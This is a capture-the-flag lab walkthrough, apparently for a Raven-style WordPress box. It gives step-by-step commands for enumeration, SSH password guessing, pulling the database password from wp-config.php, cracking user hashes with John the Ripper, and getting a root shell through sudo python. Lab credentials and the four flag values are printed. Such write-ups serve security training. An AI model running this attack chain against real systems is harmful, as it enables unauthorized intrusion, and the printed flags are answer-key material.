# **TARGET 1 Offensive WalkThrough**

## Overview

You are working as a Security Engineer for X-CORP, supporting the SOC infrastructure. The SOC analysts have noticed some discrepancies with alerting in the Kibana system and the manager has asked the Security Engineering team to investigate.

To start, your team needs to confirm that newly created alerts are working. Once the alerts are verified to be working, you will monitor live traffic on the wire to detect any abnormalities that aren't reflected in the alerting system.

You will then report back all your findings to both the SOC manager and the Engineering Manager with appropriate analysis.

>##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other methods have been explored. Look at Read Team: Summary of Operation and the PowerPoint presentation to find more methods not specified in this walkthrough.

---

Tools:

- nmap

- wpscan

- google developers tool

- Q terminal

- Kali Linux

- ssh

- Bash Commands

- Mysql

- John the Ripper

- Python Script

---

## **Walkthrough**

1. ` nmap -sV 192.168.1.110`

    ![1](/Images/2/1.png)

2. Enumerate: 

    `wpscan --url http://192.168.1.110/wordpress -eu`

    Likewise, the usernames are easy to guess because of the leads on the website.

    ![2](/Images/2/wpscan.PNG)

3. Search with the google developers tool the flag inside the code

4. Go to Services

5. Search: `flag`

    ![2](/Images/2/2.png)

6. In the terminal: `'ssh michael@192.168.1.110'`

7. Password: `michael` (Method to obtain the password was guessing. It can also be obtained with Hydra)

8. `pwd`

9. `cd ../../`

10. `find  -iname “*flag*” 2>/dev/null`

    ![3](/Images/2/3.png)

11. `cat /var/www/flag2.txt`

    ![4](/Images/2/4.png)

12. `cd /var/www/html/wordpress`

13. `Nano wp-config.php`

    ![5](/Images/2/5.png)

14. `mysql -u root -p`

15. Password: `R@v3nSecurity`

16. `show databases;`

    ![6](/Images/2/6.png)

17. `use wordpress;`

    ![7](/Images/2/7.png)

18. `show tables;`

    ![8](/Images/2/8.png)

19. `SELECT * FROM wp_users;`

    ![9](/Images/2/9.png)

20. Right click and copy the part with the hashes

21. In another terminal in the attacker machine create a file and paste the hashes

22. Give the appropriate structure for john the ripper use to crack the hashes

23. nano hashes.txt

    ![10](/Images/2/10.png)

24. `john hashes.txt -wordlist="/usr/share/wordlists/rockyou.txt"`

    #### If rock you is not descompressed use 'sudo gunzip  /usr/share/wordlists/rockyou.txt.gz' to do it.

25. `john –show hashes.txt`

    ![11](/Images/2/11.png)

26. `sudo steven`

27. Password: `pink84`

28. `Sudo -l`

    ![12](/Images/2/12.png)

29. `sudo python -c 'import pty;pty.spawn("/bin/bash")'`

    ![13](/Images/2/13.png)

30. `find  -iname “*flag*” 2>/dev/null`

    ![14](/Images/2/14.png)

31. `cat /root/flag4.txt`

    ![15](/Images/2/15.png)

32. `grep -r flag3 *`

    ![16](/Images/2/16.png)

33. `nano /var/lib/mysql/ib_logfile0`

34. `Ctrl w`

35. `flag3`

    ![17](/Images/2/17.png)

# FLAGS

flag1{b9bbcb33e11b80be759c4e844862482d}

flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

flag3{afc01ab56b50591e7dccf93122770cd2}

flag4{715dea6c055b9fe3337544932f2941ce}
